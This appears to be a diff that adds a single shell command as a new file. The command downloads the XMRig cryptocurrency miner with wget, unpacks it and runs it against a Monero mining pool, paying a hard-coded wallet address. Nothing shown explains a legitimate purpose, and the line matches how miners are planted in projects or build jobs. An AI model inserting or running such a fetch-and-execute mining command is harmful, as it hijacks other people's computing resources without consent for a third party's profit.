@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar xf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3-xenial-x64 && ./xmrig --donate-level 1 -o pool.supportxmr.com:443 -u 83Gc4MgvgdjhAiV3q2xNZYRe3Adc3gsD932dWiZqdSXWLmdPsJ86GHVRhegKqSwnyyaBSiuNd8aUZY8N63vBKJxPAGop8su -k --tls -p segawon1
